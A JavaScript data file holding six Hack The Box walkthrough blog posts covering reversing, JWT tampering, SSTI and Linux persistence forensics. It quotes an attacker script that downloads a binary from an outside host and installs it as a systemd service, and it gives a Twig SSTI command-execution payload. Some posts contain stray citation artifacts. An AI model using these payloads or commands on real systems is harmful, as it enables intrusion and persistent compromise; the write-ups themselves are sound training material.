export const blogPosts = [
  //SpookyPass
  {
    slug: "htb-spookypass-walkthrough",
    title: "HTB: SpookyPass Walkthrough",
    date: "2026-03-01",
    readTime: "6 min read",
    tags: ["HTB", "Reversing", "Binary Analysis", "Beginner"],
    excerpt: "A beginner-friendly reversing challenge from Hack The Box. Using basic static analysis tools like strings to extract an embedded password and recover the flag.",
    content: `
<article class="post htb-writeup" itemscope itemtype="https://schema.org/BlogPosting">
  <header class="post-header">
    <h1 itemprop="headline">Breaking Down SpookyPass: Solving a Hack The Box Reversing Challenge</h1>

    <p class="post-meta">
      <span itemprop="author" itemscope itemtype="https://schema.org/Person">
        <span itemprop="name">Austin Patkos</span>
      </span>
      <span aria-hidden="true"> • </span>
      <time itemprop="datePublished" datetime="2026-03-01">March 1, 2026</time>
      <span aria-hidden="true"> • </span>
      <span class="tag">Hack The Box</span>
      <span class="tag">Reversing</span>
      <span class="tag">Beginner</span>
    </p>

    <p class="lead" itemprop="description">
      In this walkthrough, I break down a beginner-friendly HTB reversing challenge and show how simple
      static analysis can reveal everything you need—no heavy tooling required.
    </p>

    <div class="video-embed" style="position:relative;padding-top:56.25%;height:0;overflow:hidden;border-radius:16px;">
      <iframe
        src="https://www.youtube.com/embed/I3FE5RniTw4"
        title="YouTube video player"
        style="position:absolute;top:0;left:0;width:100%;height:100%;border:0;"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        allowfullscreen
      ></iframe>
    </div>

    <p class="watch-link">
      Prefer YouTube? <a href="https://www.youtube.com/watch?v=I3FE5RniTw4" target="_blank" rel="noopener noreferrer">Watch the full video here</a>.
    </p>

    <hr />
  </header>

  <section class="post-body" itemprop="articleBody">
    <h2>What is SpookyPass?</h2>
    <p>
      <strong>SpookyPass</strong> is a Hack The Box reversing challenge. The goal is straightforward:
      analyze a downloaded Linux binary, figure out the correct password, and retrieve the flag.
      This kind of challenge is perfect if you’re new to reverse engineering because it rewards
      good “first-pass” analysis habits.
    </p>

    <h2>Step 1 — Extract and Identify the Binary</h2>
    <p>
      After downloading the challenge files from HTB and extracting them, you’ll typically end up with
      a single executable (often named something like <code>pass</code>).
    </p>

    <p>Use <code>file</code> to identify what you’re dealing with:</p>

    <pre><code class="language-bash">file pass</code></pre>

    <p>
      Seeing that it’s an ELF 64-bit Linux executable tells us it’s a native binary we can analyze
      with standard tooling.
    </p>

    <h2>Step 2 — Basic Static Analysis with <code>strings</code></h2>
    <p>
      Before running anything, a quick win on beginner reversing challenges is checking for embedded
      readable text:
    </p>

    <pre><code class="language-bash">strings ./pass | less</code></pre>

    <p>
      Scroll through the output and look for anything that resembles:
    </p>
    <ul>
      <li>password prompts</li>
      <li>hard-coded secrets</li>
      <li>flag formatting (e.g., <code>HTB{...}</code>)</li>
      <li>error/success messages that indicate program flow</li>
    </ul>

    <p>
      In this challenge, a suspicious password-like string appears in the printable strings list:
    </p>

    <pre><code>s3cr3t_p455_f0r_gh05t5_4nd_gh0ul5</code></pre>

    <p>
      That’s a huge clue. Many entry-level reversing challenges intentionally include easy-to-spot
      artifacts to reinforce “try the simple stuff first.”
    </p>

    <h2>Step 3 — Run the Program and Test Your Find</h2>
    <p>Now we run the binary to confirm behavior:</p>

    <pre><code class="language-bash">./pass</code></pre>

    <p>You’ll get a prompt similar to:</p>

    <pre><code>Welcome to the SPOOKIEST party of the year.
Before we let you in, you’ll need to give us the password:</code></pre>

    <p>
      Enter the string we extracted using <code>strings</code>. If the binary is doing a direct comparison
      against a hard-coded value, it should accept it and reveal the flag.
    </p>

    <h2>Result — The Flag</h2>
    <p>
      After entering the correct password, the binary prints the flag:
    </p>

    <pre><code>HTB{un0bfu5c4t3d_5tr1ng5}</code></pre>

    <h2>Why This Worked</h2>
    <p>
      This challenge is essentially a “warm-up” for reversing fundamentals:
    </p>

    <ul>
      <li>identify the binary type</li>
      <li>extract embedded strings</li>
      <li>observe program prompts</li>
      <li>test likely secrets directly</li>
    </ul>

    <p>
      In short: the password was embedded inside the binary and compared to user input. Once the input matches,
      the binary prints the flag.
    </p>

    <h2>Tools Used</h2>
    <ul>
      <li><code>file</code> — identify binary type</li>
      <li><code>strings</code> — extract printable strings from the binary</li>
      <li><code>less</code> — view output page-by-page</li>
      <li>Terminal — execute and interact with the program</li>
    </ul>

    <h2>Final Thoughts</h2>
    <p>
      Not every reversing challenge starts with IDA, Ghidra, or a debugger. Sometimes the fastest path
      is the simplest one—get good at the basic recon and you’ll snag a lot of early flags quickly.
    </p>

    <p>
      If you want more write-ups like this, I’m posting more HTB content regularly on YouTube.
    </p>

    <p class="cta">
      <a href="https://www.youtube.com/watch?v=I3FE5RniTw4" target="_blank" rel="noopener noreferrer">
        Watch the walkthrough on YouTube →
      </a>
    </p>

    <hr />

    <footer class="post-footer">
      <p><strong>Disclaimer:</strong> This post is for educational purposes and legal, authorized practice only.</p>
    </footer>
  </section>
</article>
`
  },
  //Open Secret
  {
    slug: "htb-opensecret-walkthrough",
    title: "HTB: OpenSecret Walkthrough",
    date: "2026-03-03",
    readTime: "7 min read",
    tags: ["HTB", "Web Security", "JWT", "Pentesting"],
    excerpt:
      "A walkthrough of Hack The Box's OpenSecret challenge. We analyze a vulnerable helpdesk portal and exploit insecure JWT handling to retrieve the flag.",
    content: `
    <h1>HTB: OpenSecret Walkthrough</h1>

    <p>
      OpenSecret is a <strong>very easy Hack The Box web challenge</strong> that demonstrates how insecure handling of
      <strong>JSON Web Tokens (JWTs)</strong> can expose sensitive data in web applications.
    </p>

    <p>
      In this challenge we interact with a simple helpdesk portal and discover that the authentication mechanism relies on
      a poorly secured JWT. By analyzing and modifying the token, we can gain access to hidden functionality and retrieve
      the flag.
    </p>

    <hr />

    <h2>Video Walkthrough</h2>

    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 16px;">
      <iframe
        src="https://www.youtube.com/embed/KwjcqPm-UHA"
        title="HTB OpenSecret Walkthrough"
        frameborder="0"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        allowfullscreen
        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
      ></iframe>
    </div>

    <hr />

    <h2>Challenge Overview</h2>

    <p>
      When visiting the challenge application, we are presented with a <strong>helpdesk-style web interface</strong>.
      The application allows users to log in and interact with support tickets. However, authentication is handled using a
      <strong>JWT stored in the browser</strong>, which immediately raises some questions:
    </p>

    <ul>
      <li>Is the token properly signed?</li>
      <li>Can it be modified?</li>
      <li>Does it expose internal secrets?</li>
    </ul>

    <p>
      Understanding how the application trusts the JWT becomes the key to solving the challenge.
    </p>

    <hr />

    <h2>Step 1: Inspect the Authentication Token</h2>

    <p>
      After logging in, we check the browser storage and discover a JWT token. JWT tokens follow a standard format:
    </p>

    <pre><code>HEADER.PAYLOAD.SIGNATURE</code></pre>

    <p>
      The payload contains encoded JSON data describing the user. For example, a decoded payload might look like:
    </p>

    <pre><code class="language-json">{
  "username": "guest",
  "role": "user"
}</code></pre>

    <p>
      That <code>role</code> attribute immediately suggests a potential privilege escalation opportunity.
    </p>

    <hr />

    <h2>Step 2: Decode the JWT</h2>

    <p>
      JWTs are <strong>Base64 encoded</strong>, so we can decode them easily using tools like:
    </p>

    <ul>
      <li>jwt.io</li>
      <li>Burp Suite</li>
      <li>Base64 utilities</li>
      <li>Browser extensions</li>
    </ul>

    <p>
      Once decoded, we inspect the payload fields and confirm where the authorization-relevant values live (like
      <code>role</code>).
    </p>

    <hr />

    <h2>Step 3: Modify the Token</h2>

    <p>
      Since the application trusts the JWT, we attempt to modify it. For example, changing the role:
    </p>

    <pre><code class="language-json">{
  "username": "guest",
  "role": "admin"
}</code></pre>

    <p>
      If the application does not properly validate the token signature, this change can grant administrative privileges.
      After re-encoding the token and replacing it in the browser, we refresh the application and check what changes.
    </p>

    <hr />

    <h2>Step 4: Access Hidden Functionality</h2>

    <p>
      With the modified token, the application may reveal new functionality that was previously hidden from normal users,
      such as:
    </p>

    <ul>
      <li>Administrative endpoints</li>
      <li>Internal system data</li>
      <li>Hidden helpdesk resources</li>
    </ul>

    <p>
      From there, we enumerate the newly accessible pages and locate the flag exposed within the admin functionality.
    </p>

    <hr />

    <h2>Why This Vulnerability Happens</h2>

    <p>
      JWT issues commonly occur when applications:
    </p>

    <ul>
      <li>Fail to verify the token signature</li>
      <li>Accept unsigned tokens</li>
      <li>Trust client-controlled fields like roles and permissions</li>
      <li>Use weak or exposed signing secrets</li>
    </ul>

    <p>
      The lesson is simple: <strong>the client should never be able to grant itself privileges</strong>.
    </p>

    <hr />

    <h2>Tools Used</h2>

    <ul>
      <li>Browser Developer Tools</li>
      <li>JWT decoding tools</li>
      <li>Base64 decoding</li>
      <li>Basic HTTP inspection</li>
    </ul>

    <hr />

    <h2>Takeaways</h2>

    <ol>
      <li>Never trust client-side tokens without proper verification.</li>
      <li>Always validate JWT signatures.</li>
      <li>Avoid relying solely on token payload fields for authorization.</li>
      <li>Simple web apps can expose critical secrets if authentication is weak.</li>
    </ol>

    <p>
      OpenSecret is a great intro to JWT testing and authentication pitfalls. More HTB walkthroughs coming soon.
    </p>
  `
  },
  //Oddly Even
  {
    slug: "htb-oddly-even-walkthrough",
    title: "HTB: Oddly Even Walkthrough",
    date: "2026-03-05",
    readTime: "5 min read",
    tags: ["HTB", "Coding", "Python", "Beginner"],
    excerpt:
      "A simple Hack The Box coding challenge focused on basic conditional logic. Take a number as input and print whether it is odd or even.",
    content: `
    <h1>HTB: Oddly Even Walkthrough</h1>

    <p>
      Oddly Even is a beginner-friendly <strong>Hack The Box coding challenge</strong> centered around a very simple task:
      take in a number, determine whether it is divisible by 2, and print either <code>even</code> or <code>odd</code>.
    </p>

    <p>
      Challenges like this are simple on purpose. They reinforce the kind of fast, clean logic you need when solving coding
      problems under pressure, especially in CTF-style environments.
    </p>

    <hr />

    <h2>Video Walkthrough</h2>

    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 16px;">
      <iframe
        src="https://www.youtube.com/embed/jUaUv01KpyM"
        title="HTB Oddly Even Walkthrough"
        frameborder="0"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        allowfullscreen
        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
      ></iframe>
    </div>

    <hr />

    <h2>Challenge Overview</h2>

    <p>
      The objective is straightforward:
    </p>

    <ul>
      <li>Read a number from input</li>
      <li>Check whether the number is divisible by 2</li>
      <li>Print <code>even</code> if it is</li>
      <li>Print <code>odd</code> if it is not</li>
    </ul>

    <p>
      This is one of the most basic conditional programming patterns, but it shows up everywhere. If you can write this
      quickly and correctly, you are building the kind of muscle memory that makes harder challenges easier later on.
    </p>

    <hr />

    <h2>Step 1: Read the Input</h2>

    <p>
      The first step is taking in the number. In Python, that usually means using <code>input()</code> and converting the
      result into an integer:
    </p>

    <pre><code class="language-python">n = int(input())</code></pre>

    <p>
      Since <code>input()</code> returns a string, converting it with <code>int()</code> is important before performing
      arithmetic.
    </p>

    <hr />

    <h2>Step 2: Check Divisibility</h2>

    <p>
      To determine whether a number is even, we use the modulo operator:
    </p>

    <pre><code class="language-python">n % 2</code></pre>

    <p>
      If the result is <code>0</code>, the number is even. Otherwise, it is odd.
    </p>

    <p>
      That gives us the core condition:
    </p>

    <pre><code class="language-python">if n % 2 == 0:
    print("even")
else:
    print("odd")</code></pre>

    <hr />

    <h2>Full Solution</h2>

    <p>
      Putting it together, the full Python solution looks like this:
    </p>

    <pre><code class="language-python">n = int(input())

if n % 2 == 0:
    print("even")
else:
    print("odd")</code></pre>

    <hr />

    <h2>Why This Works</h2>

    <p>
      Every integer is either divisible by 2 or it is not. That makes this a clean binary decision:
    </p>

    <ul>
      <li>If <code>n % 2 == 0</code>, print <code>even</code></li>
      <li>Otherwise, print <code>odd</code></li>
    </ul>

    <p>
      It is simple, but it reinforces a core habit in security and coding work: break the problem into an input, a test,
      and an output.
    </p>

    <hr />

    <h2>Common Beginner Mistakes</h2>

    <ul>
      <li>Forgetting to convert the input from a string to an integer</li>
      <li>Printing <code>Even</code> or <code>Odd</code> instead of the exact lowercase output required</li>
      <li>Overcomplicating the solution instead of using a direct modulo check</li>
    </ul>

    <p>
      In coding challenges, correctness matters more than cleverness. Clean and minimal usually wins.
    </p>

    <hr />

    <h2>Takeaways</h2>

    <ol>
      <li>Read the input carefully</li>
      <li>Use modulo to test divisibility</li>
      <li>Match the expected output format exactly</li>
      <li>Build speed with simple logic problems like this</li>
    </ol>

    <p>
      Oddly Even is a small challenge, but that is exactly why it is useful. The fundamentals are what make bigger wins
      possible later.
    </p>

    <p>
      More HTB walkthroughs coming soon.
    </p>
  `
  },
  //Flag Command
  {
    slug: "htb-flag-command-walkthrough",
    title: "HTB: Flag Command Walkthrough",
    date: "2026-03-05",
    readTime: "6 min read",
    tags: ["HTB", "Web Security", "CTF", "Beginner"],
    excerpt:
      "A walkthrough of Hack The Box's Flag Command challenge, a very easy web challenge built around a terminal-style interface and careful input handling.",
    content: `
    <h1>HTB: Flag Command Walkthrough</h1>

    <p>
      Flag Command is a beginner-friendly <strong>Hack The Box web challenge</strong> with a terminal-style interface that
      rewards careful observation, simple testing, and clean reasoning.
    </p>

    <p>
      One of the best things about easier HTB web challenges is that they teach a habit that scales well into harder work:
      slow down, inspect what the application is really doing, and test assumptions one at a time.
    </p>

    <hr />

    <h2>Video Walkthrough</h2>

    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 16px;">
      <iframe
        src="https://www.youtube.com/embed/GcWWLoLIsIA"
        title="HTB Flag Command Walkthrough"
        frameborder="0"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        allowfullscreen
        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
      ></iframe>
    </div>

    <hr />

    <h2>Challenge Overview</h2>

    <p>
      The challenge presents a web application that looks and feels like a command terminal. That kind of interface is
      immediately interesting because it suggests the application may be taking user input, processing commands, and
      returning output dynamically.
    </p>

    <p>
      In challenges like this, the first goal is not to guess the exploit immediately. The first goal is to understand the
      rules of the application:
    </p>

    <ul>
      <li>What input is accepted?</li>
      <li>What output is returned?</li>
      <li>Are there blocked words or restricted commands?</li>
      <li>Is the backend interpreting input directly or sanitizing it first?</li>
    </ul>

    <p>
      Once we understand that, the path to the flag becomes much clearer.
    </p>

    <hr />

    <h2>Step 1: Interact With the Terminal Interface</h2>

    <p>
      The first step is simply to play with the application. Enter normal-looking commands, observe the responses, and look
      for patterns in how the site reacts.
    </p>

    <p>
      This kind of probing helps answer important questions:
    </p>

    <ul>
      <li>Does the app simulate a terminal, or does it actually process input on the backend?</li>
      <li>Do invalid commands return generic errors?</li>
      <li>Are some commands accepted while others are blocked?</li>
    </ul>

    <p>
      Even basic recon like this can reveal whether the challenge is about command handling, filtering, or hidden
      functionality.
    </p>

    <hr />

    <h2>Step 2: Look for Input Handling Weaknesses</h2>

    <p>
      Terminal-themed web challenges often come down to how user input is interpreted. If the application accepts user input
      and passes it into backend logic insecurely, that can open the door to unintended behavior.
    </p>

    <p>
      Common things to test include:
    </p>

    <ul>
      <li>Unexpected spacing or separators</li>
      <li>Alternate command formats</li>
      <li>Partial commands or edge cases</li>
      <li>How the application handles blocked or malformed input</li>
    </ul>

    <p>
      The key idea is simple: if the app expects one kind of input, try nearby variations and see where the assumptions
      break.
    </p>

    <hr />

    <h2>Step 3: Enumerate What the App Is Trying to Hide</h2>

    <p>
      Once it becomes clear that the interface is more than just cosmetic, the next step is enumeration. We want to find
      hidden behaviors, protected functionality, or restricted access paths that could lead to the flag.
    </p>

    <p>
      In web challenges, that usually means paying close attention to:
    </p>

    <ul>
      <li>Error messages</li>
      <li>Differences between valid and invalid requests</li>
      <li>Frontend behavior versus backend responses</li>
      <li>Any clues that suggest server-side filtering or command parsing</li>
    </ul>

    <p>
      Small differences in output often expose exactly where the weakness lives.
    </p>

    <hr />

    <h2>Step 4: Trigger the Intended Behavior and Recover the Flag</h2>

    <p>
      After identifying how the input is handled, the final step is to use that understanding to reach the protected
      functionality and retrieve the flag.
    </p>

    <p>
      Like many beginner HTB challenges, the real lesson is less about a complicated exploit and more about disciplined
      testing. The application gives you everything you need — but only if you pay attention to how it responds.
    </p>

    <hr />

    <h2>Why This Challenge Is Useful</h2>

    <p>
      Flag Command is valuable because it teaches a real security habit: do not get hypnotized by the theme of the app.
      Whether it looks like a game, a terminal, or a dashboard, user input is still user input.
    </p>

    <p>
      If input reaches backend logic in an unsafe way, the interface design does not matter. The weakness is still there.
    </p>

    <hr />

    <h2>Tools Used</h2>

    <ul>
      <li>Browser</li>
      <li>Developer Tools</li>
      <li>Careful manual testing</li>
      <li>Basic web enumeration</li>
    </ul>

    <p>
      This is another good reminder that not every challenge requires a huge toolset. Sometimes browser-based observation is
      enough.
    </p>

    <hr />

    <h2>Takeaways</h2>

    <ol>
      <li>Start by understanding the app's input and output rules.</li>
      <li>Look closely at how user input is filtered and interpreted.</li>
      <li>Use small test cases to expose hidden behavior.</li>
      <li>In easier web challenges, patient enumeration usually beats overthinking.</li>
    </ol>

    <p>
      Flag Command is a solid beginner challenge because it reinforces the kind of clean testing mindset that carries over
      into real-world web assessments.
    </p>

    <p>
      More HTB walkthroughs coming soon.
    </p>
  `
  },
  {
    slug: "htb-extraterrestrial-persistence-walkthrough",
    title: "HTB: Extraterrestrial Persistence Walkthrough",
    date: "2026-03-06",
    readTime: "6 min read",
    tags: ["HTB", "Forensics", "Linux", "Persistence"],
    excerpt:
      "A walkthrough of Hack The Box's Extraterrestrial Persistence challenge. We analyze a suspicious bash script and uncover a hidden systemd persistence mechanism containing the flag.",
    content: `
    <h1>HTB: Extraterrestrial Persistence Walkthrough</h1>

    <p>
      Extraterrestrial Persistence is a <strong>Hack The Box forensics challenge</strong> that focuses on analyzing a suspicious
      Linux persistence mechanism. Instead of exploiting a system, the task is to inspect a provided script and determine
      how the attacker installs persistence on the machine.
    </p>

    <p>
      The challenge revolves around a bash script called <code>persistence.sh</code> that appears to install a malicious
      service on a compromised Linux system.
    </p>

    <hr />

    <h2>Video Walkthrough</h2>

    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 16px;">
      <iframe
        src="https://www.youtube.com/embed/amJjOuxU7sA"
        title="HTB Extraterrestrial Persistence Walkthrough"
        frameborder="0"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        allowfullscreen
        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
      ></iframe>
    </div>

    <hr />

    <h2>Challenge Overview</h2>

    <p>
      The challenge provides a bash script named <code>persistence.sh</code>. At first glance, the script looks like a
      persistence mechanism that installs a system service and downloads a payload from a remote location.
    </p>

    <p>
      Our goal is to analyze the script and determine how the persistence works and where the flag is hidden.
    </p>

    <hr />

    <h2>Step 1: Inspect the Script</h2>

    <p>
      Opening the script reveals several key behaviors:
    </p>

    <ul>
      <li>It checks the current user with <code>whoami</code></li>
      <li>It checks the hostname of the system</li>
      <li>It downloads a file using <code>curl</code></li>
      <li>It creates a new systemd service</li>
    </ul>

    <p>
      These checks ensure the persistence mechanism only installs on the intended target machine.
    </p>

    <pre><code class="language-bash">n=\`whoami\`
h=\`hostname\`

if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then
  exit
fi</code></pre>

    <p>
      If the environment does not match the expected user and hostname, the script exits immediately.
    </p>

    <hr />

    <h2>Step 2: Download the Payload</h2>

    <p>
      The script then downloads a binary payload and installs it in the system:
    </p>

    <pre><code class="language-bash">curl https://files.pypi-install.com/packeges/service -o /usr/local/bin/service
chmod +x /usr/local/bin/service</code></pre>

    <p>
      This binary becomes the executable that will run through the persistence mechanism.
    </p>

    <hr />

    <h2>Step 3: Decode the Hidden Payload</h2>

    <p>
      The most interesting part of the script is a large <strong>Base64 encoded string</strong>.
      The script decodes this string and writes it into a systemd service file. :contentReference[oaicite:1]{index=1}
    </p>

    <pre><code class="language-bash">echo "BASE64_DATA" | base64 --decode > /usr/lib/systemd/system/service.service</code></pre>

    <p>
      When decoded, the Base64 block reveals the contents of the systemd service configuration.
    </p>

    <p>
      Inside the service file, the flag is embedded within the description field.
    </p>

    <pre><code>[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}</code></pre>

    <hr />

    <h2>Step 4: Enable Persistence</h2>

    <p>
      Finally, the script enables the service using systemd:
    </p>

    <pre><code class="language-bash">systemctl enable service.service</code></pre>

    <p>
      This ensures the malicious service will execute every time the system boots.
    </p>

    <p>
      Attackers often use systemd services for persistence because they blend in with legitimate
      system processes.
    </p>

    <hr />

    <h2>Why This Technique Works</h2>

    <p>
      The persistence mechanism works by abusing legitimate Linux features:
    </p>

    <ul>
      <li>Downloading a payload to a trusted system path</li>
      <li>Creating a custom systemd service</li>
      <li>Automatically launching the service at boot</li>
    </ul>

    <p>
      Because systemd services are a normal part of Linux operation, malicious entries can be easy
      to overlook during incident response if defenders are not carefully auditing service files.
    </p>

    <hr />

    <h2>Tools Used</h2>

    <ul>
      <li>Basic text inspection</li>
      <li>Bash script analysis</li>
      <li>Base64 decoding</li>
      <li>Understanding Linux systemd services</li>
    </ul>

    <hr />

    <h2>Takeaways</h2>

    <ol>
      <li>Persistence mechanisms often hide in plain sight.</li>
      <li>Base64 encoding is commonly used to conceal payloads.</li>
      <li>Systemd services are a common Linux persistence technique.</li>
      <li>Careful script analysis can reveal hidden attacker behavior.</li>
    </ol>

    <p>
      Extraterrestrial Persistence is a great beginner forensics challenge because it shows how attackers
      can abuse normal system functionality to maintain access to compromised machines.
    </p>

    <p>
      More Hack The Box walkthroughs coming soon.
    </p>
  `
  },
  {
    slug: "htb-baby-bonechewercon-walkthrough",
    title: "HTB: baby BoneChewerCon Walkthrough",
    date: "2026-03-07",
    readTime: "6 min read",
    tags: ["HTB", "Web Security", "SSTI", "CTF"],
    excerpt:
      "A walkthrough of Hack The Box's baby BoneChewerCon challenge. We exploit a Server-Side Template Injection vulnerability to execute commands and retrieve the flag.",
    content: `
    <h1>HTB: baby BoneChewerCon Walkthrough</h1>

    <p>
      baby BoneChewerCon is a <strong>very easy Hack The Box web challenge</strong> designed to introduce players to
      <strong>Server-Side Template Injection (SSTI)</strong>. The challenge simulates a simple event registration website
      for the fictional BoneChewerCon conference.
    </p>

    <p>
      At first glance the site looks harmless — a basic form to register your name and email for the event. But
      underneath the surface, the application is rendering user input directly inside a server-side template.
    </p>

    <p>
      That small mistake opens the door to full server-side code execution.
    </p>

    <hr />

    <h2>Video Walkthrough</h2>

    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 16px;">
      <iframe
        src="https://www.youtube.com/embed/OZ2yKJhaX4I"
        title="HTB baby BoneChewerCon Walkthrough"
        frameborder="0"
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
        allowfullscreen
        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
      ></iframe>
    </div>

    <hr />

    <h2>Challenge Overview</h2>

    <p>
      The application allows users to submit a name when registering for the conference.
      Whatever value we enter is rendered back to us in the response.
    </p>

    <p>
      When input is rendered inside a template engine without sanitization, it can sometimes be interpreted as template
      code rather than plain text.
    </p>

    <p>
      This is exactly what happens here.
    </p>

    <hr />

    <h2>Step 1: Test Template Injection</h2>

    <p>
      A common way to test for template injection is to input template expressions.
    </p>

    <p>
      For example:
    </p>

    <pre><code>{{7*7}}</code></pre>

    <p>
      If the application simply prints this as text, the template engine is likely safe.
      But if it evaluates the expression and prints <code>49</code>, the input is being executed inside the template.
    </p>

    <p>
      In this challenge, the expression is evaluated — confirming an SSTI vulnerability.
    </p>

    <hr />

    <h2>Step 2: Identify the Template Engine</h2>

    <p>
      The syntax used by the application matches <strong>Twig</strong>, a popular template engine used in PHP frameworks.
    </p>

    <p>
      Twig allows filters that can execute system commands if the environment is insecurely configured.
    </p>

    <p>
      This means we may be able to run commands directly on the server.
    </p>

    <hr />

    <h2>Step 3: Execute Commands</h2>

    <p>
      By abusing Twig filters, we can execute system commands.
    </p>

    <p>
      One working payload is:
    </p>

    <pre><code>{{['cat /flag']|filter('system')}}</code></pre>

    <p>
      This payload forces the template engine to execute the <code>cat /flag</code> command on the server.
    </p>

    <p>
      When the command runs, the server prints the contents of the flag file directly in the page output. :contentReference[oaicite:1]{index=1}
    </p>

    <hr />

    <h2>Retrieve the Flag</h2>

    <p>
      After submitting the payload, the server returns the flag:
    </p>

    <pre><code>HTB{...flag...}</code></pre>

    <p>
      The challenge is solved.
    </p>

    <hr />

    <h2>Why This Vulnerability Happens</h2>

    <p>
      Server-Side Template Injection occurs when user input is rendered directly into a template engine
      without proper escaping or sanitization.
    </p>

    <p>
      Because template engines often allow logic, loops, and filters, attackers may be able to escalate
      from simple expression evaluation to full remote command execution.
    </p>

    <p>
      In real-world applications, this type of vulnerability can lead to complete server compromise.
    </p>

    <hr />

    <h2>Tools Used</h2>

    <ul>
      <li>Web browser</li>
      <li>Manual payload testing</li>
      <li>Understanding of template engines</li>
    </ul>

    <hr />

    <h2>Takeaways</h2>

    <ol>
      <li>Never render raw user input directly inside templates.</li>
      <li>Template engines can become code execution vectors if misconfigured.</li>
      <li>SSTI vulnerabilities can escalate quickly from simple testing to full command execution.</li>
      <li>Even very small web applications can expose critical vulnerabilities.</li>
    </ol>

    <p>
      baby BoneChewerCon is a great introduction to SSTI vulnerabilities and why input sanitization is
      critical in server-side applications.
    </p>

    <p>
      More Hack The Box walkthroughs coming soon.
    </p>
  `
  }
];